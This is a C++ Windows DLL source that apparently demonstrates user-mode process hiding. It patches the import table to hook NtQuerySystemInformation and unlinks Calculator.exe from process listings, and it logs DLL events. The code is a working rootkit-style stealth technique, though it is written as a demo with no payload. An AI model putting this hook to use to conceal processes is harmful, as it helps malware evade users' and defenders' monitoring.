// dllmain.cpp : Defines the entry point for the DLL application.
#include "Winternl.h"
#include "pch.h"
#include <iostream>

#pragma warning(disable : 4996)

#define LOG_FILE L"Z:\\MyLogFile.txt"

typedef NTSTATUS(WINAPI *PNTQSI)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation, __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength);

void Patch();
void WriteLog(wchar_t const *text) {
  HANDLE hfile = CreateFileW(LOG_FILE, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                             OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  DWORD written;
  SetFilePointer(hfile, 0, NULL, FILE_END);
  WriteFile(hfile, text, wcslen(text) * 2, &written, NULL);
  WriteFile(hfile, L"\r\n", 4, &written, NULL);
  CloseHandle(hfile);
}

ULONGLONG OriginalNtQuerySystemInformationAddress;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
                      LPVOID lpReserved) {

  switch (ul_reason_for_call) {
  case DLL_PROCESS_ATTACH:
    WriteLog(L"Process Attached!");
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    Patch();
    break;
  case DLL_THREAD_ATTACH:
    WriteLog(L"Thread Attached!");
    break;
  case DLL_THREAD_DETACH:
    WriteLog(L"Thread Detached!");
    break;
  case DLL_PROCESS_DETACH:
    WriteLog(L"Process Detached!");
    break;
  }
  return TRUE;
}

__kernel_entry NTSTATUS NTAPI HookedNtQuerySystemInformation(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation, IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL) {
  NTSTATUS status = ((PNTQSI)OriginalNtQuerySystemInformationAddress)(
      SystemInformationClass, SystemInformation, SystemInformationLength,
      ReturnLength);
  if (SystemInformationClass == SystemProcessInformation &&
      ReturnLength != NULL) {
    if (NT_SUCCESS(status)) {
      PSYSTEM_PROCESS_INFORMATION modifiedSystemInformation =
          PSYSTEM_PROCESS_INFORMATION(SystemInformation);
      LPBYTE firstModifiedSystemInformation = (LPBYTE)modifiedSystemInformation;
      while (modifiedSystemInformation->NextEntryOffset) {
        PSYSTEM_PROCESS_INFORMATION nextProcessInformation =
            PSYSTEM_PROCESS_INFORMATION(
                modifiedSystemInformation->NextEntryOffset +
                (LPBYTE)modifiedSystemInformation);
        if (wcscmp(nextProcessInformation->ImageName.Buffer,
                   L"Calculator.exe") == 0) {
          modifiedSystemInformation->NextEntryOffset =
              nextProcessInformation->NextEntryOffset +
              modifiedSystemInformation->NextEntryOffset;
          break;
        }
        modifiedSystemInformation =
            (PSYSTEM_PROCESS_INFORMATION)(modifiedSystemInformation
                                              ->NextEntryOffset +
                                          (LPBYTE)modifiedSystemInformation);
      }
      SystemInformation = firstModifiedSystemInformation;
    }
  }
  return status;
}

void Patch() {
  const char *dllName = "dll.dll";
  const char *funcName = "NtQuerySystemInformation";
  // https://stackoverflow.com/questions/7673754/pe-format-iat-questions
  HMODULE hModule = GetModuleHandle(NULL);
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS64 ntHeader =
      (PIMAGE_NT_HEADERS64)((DWORD64)hModule + dosHeader->e_lfanew);
  IMAGE_OPTIONAL_HEADER64 optionalHeader = ntHeader->OptionalHeader;
  IMAGE_DATA_DIRECTORY imageDataDirectory =
      optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  PIMAGE_IMPORT_DESCRIPTOR imageImportDescriptor =
      (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)hModule +
                                 imageDataDirectory.VirtualAddress);

  while (imageImportDescriptor->FirstThunk) {

    PIMAGE_IMPORT_BY_NAME dllIBN =
        (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule + imageImportDescriptor->Name);
    std::cout << dllIBN->Name << std::endl;
    if (std::string(dllName).compare(dllIBN->Name) == 0) {
      PIMAGE_THUNK_DATA64 originalFirstThunk =
          (PIMAGE_THUNK_DATA64)((DWORD64)hModule +
                                imageImportDescriptor->OriginalFirstThunk);
      PIMAGE_THUNK_DATA64 firstThunk =
          (PIMAGE_THUNK_DATA64)((DWORD64)hModule +
                                imageImportDescriptor->FirstThunk);

      while (originalFirstThunk->u1.AddressOfData) {
        PIMAGE_IMPORT_BY_NAME funcIBN =
            (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule +
                                    originalFirstThunk->u1.AddressOfData);
        std::cout << funcIBN->Name << std::endl;
        if (std::string(funcName).compare(funcIBN->Name) == 0) {
          std::cout << "NTQuerySystemInformation Found!" << std::endl;
          OriginalNtQuerySystemInformationAddress = firstThunk->u1.Function;

          DWORD oldProtect = 0;
          BOOL succ = VirtualProtect((LPVOID)&firstThunk->u1.Function, 8,
                                     PAGE_READWRITE, &oldProtect);
          char patch[8] = {0};
          void *hookAddress = &HookedNtQuerySystemInformation;
          memcpy_s(patch, 8, &hookAddress, 8);
          succ = WriteProcessMemory(GetCurrentProcess(),
                                    (LPVOID)&firstThunk->u1.Function, patch,
                                    sizeof(patch), NULL);
          break;
        }
        originalFirstThunk++;
        firstThunk++;
      }
      break;
    }
    // not same with getting process name (i realize that it was an array, not
    // offset)
    imageImportDescriptor++;
  }
}
